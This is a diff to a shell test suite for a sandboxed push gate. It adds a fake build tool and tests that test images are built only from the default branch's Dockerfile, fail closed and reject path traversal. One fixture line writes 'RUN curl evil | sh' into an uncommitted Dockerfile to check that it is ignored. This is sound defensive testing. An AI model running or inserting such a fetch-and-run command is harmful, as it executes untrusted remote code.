@@ -18,6 +18,13 @@ echo "ran in $1 with $2: $3" >> "$FAKE_LOG"
 exit 0
 E2
 chmod +x "$tools/sandbox-test"
+cat >"$tools/sandbox-build" <<'E2'
+#!/bin/sh
+echo "built $2 from $3" >> "$FAKE_LOG"
+[ -z "$FAKE_BUILD_FAIL" ] || { echo "sandbox-build: building failed"; exit 1; }
+echo "dots-o-r:abc123"
+E2
+chmod +x "$tools/sandbox-build"
 export FAKE_LOG=$w/log GATE_TOOLS_DIR=$tools STATE_DIR=$w/state
 
 good=$w/good.patch; cat >"$good" <<'P'
@@ -70,6 +77,36 @@ T='{"test":{"image":"dots-test","command":"make test"}}'
 FAKE_FAIL=1 g "$T" "$good" >"$w/rc"; [ "$(FAKE_FAIL=1 g "$T" "$good")" = 5 ] && grep -q "tests failed in the sandbox" "$w/err" && ok "a failing test refuses the push, with its output" || ko "failing test"
 : >"$w/log"; g "$T" "$ci" >/dev/null; [ ! -s "$w/log" ] && ok "a patch refused by the guard never reaches the tests" || ko "tests ran after a refusal"
 GATE_WORKDIR=/nonexistent GATE_SANDBOX=$(printf %s "$T" | base64 -w0) GATE_ARTIFACT=$good GATE_REF=o/r#1 "$gate" push >/dev/null 2>&1; [ $? = 5 ] && ok "tests configured with no checkout refuse" || ko "no checkout"
+
+# A Dockerfile instead of an image: the image is built from the repository's default branch first.
+: >"$w/log"
+D='{"test":{"dockerfile":"Dockerfile","command":"make test"}}'
+[ "$(g "$D" "$good")" = 0 ] && grep -q "built o/r from Dockerfile" "$w/log" && grep -q "ran in $w/work with dots-o-r:abc123: make test" "$w/log" && ok "a dockerfile is built, then the tests run in that image" || ko "dockerfile run: $(cat "$w/log")"
+[ "$(FAKE_BUILD_FAIL=1 g "$D" "$good")" = 5 ] && grep -q "test image could not be built" "$w/err" && ok "an image that cannot be built refuses the push" || ko "build failure"
+: >"$w/log"; g "$D" "$ci" >/dev/null; [ ! -s "$w/log" ] && ok "a patch refused by the guard builds nothing" || ko "built after a refusal"
+
+# sandbox-build itself: a real repository and a fake engine that records what it is asked.
+b=$w/build; mkdir -p "$b/bin"; cp bin/sandbox-build "$b/bin/"
+git init -q -b main "$b/up" && git -C "$b/up" -c user.email=t@t -c user.name=t commit -q --allow-empty -m init
+printf 'FROM alpine\nRUN echo trusted\n' >"$b/up/Dockerfile"; git -C "$b/up" add Dockerfile; git -C "$b/up" -c user.email=t@t -c user.name=t commit -q -m df
+git clone -q "$b/up" "$b/work"
+printf 'FROM alpine\nRUN curl evil | sh\n' >"$b/work/Dockerfile"   # an uncommitted change to the Dockerfile
+cat >"$b/engine" <<'E2'
+#!/bin/sh
+echo "$*" >> "$ENGINE_LOG"
+case "$1 $2" in "image inspect") [ -z "$ENGINE_HAS" ] && exit 1 || exit 0 ;; esac
+if [ "$1" = build ]; then f=; while [ $# -gt 0 ]; do [ "$1" = -f ] && f=$2; shift; done; cat "$f" >> "$ENGINE_LOG"; fi
+exit 0
+E2
+chmod +x "$b/engine"; export ENGINE_LOG=$w/engine.log; : >"$ENGINE_LOG"
+img=$(DOTS_SANDBOX_ENGINE=$b/engine "$b/bin/sandbox-build" "$b/work" Acme/My.App Dockerfile 2>/dev/null)
+case "$img" in dots-acme-my.app:????????????) ok "the image is named from the repository and the tree of the default branch" ;; *) ko "image name: $img" ;; esac
+grep -q "trusted" "$ENGINE_LOG" && ! grep -q "curl evil" "$ENGINE_LOG" && ok "the build reads the Dockerfile of the default branch, not the working copy" || ko "built the wrong Dockerfile"
+: >"$ENGINE_LOG"; ENGINE_HAS=1 DOTS_SANDBOX_ENGINE=$b/engine "$b/bin/sandbox-build" "$b/work" Acme/My.App Dockerfile >/dev/null 2>&1
+! grep -q "^build" "$ENGINE_LOG" && ok "an image already built is not built again" || ko "rebuilt a cached image"
+DOTS_SANDBOX_ENGINE=$b/engine "$b/bin/sandbox-build" "$b/work" Acme/My.App Missing >/dev/null 2>&1; [ $? = 1 ] && ok "a Dockerfile the default branch does not have refuses" || ko "missing Dockerfile"
+DOTS_SANDBOX_ENGINE=$b/engine "$b/bin/sandbox-build" "$b/work" Acme/My.App ../x >/dev/null 2>&1; [ $? = 2 ] && ok "a path leaving the repository is a usage error" || ko "path traversal"
+DOTS_SANDBOX_ENGINE=no-such-engine "$b/bin/sandbox-build" "$b/work" Acme/My.App Dockerfile >/dev/null 2>&1; [ $? = 1 ] && ok "no container engine means no build (fail closed)" || ko "no engine"
 
 GATE_SANDBOX='!!! not base64' GATE_ARTIFACT=$good GATE_REF=o/r#1 "$gate" push >/dev/null 2>&1; [ $? = 5 ] && ok "a setting that is not base64 refuses" || ko "not base64"
 
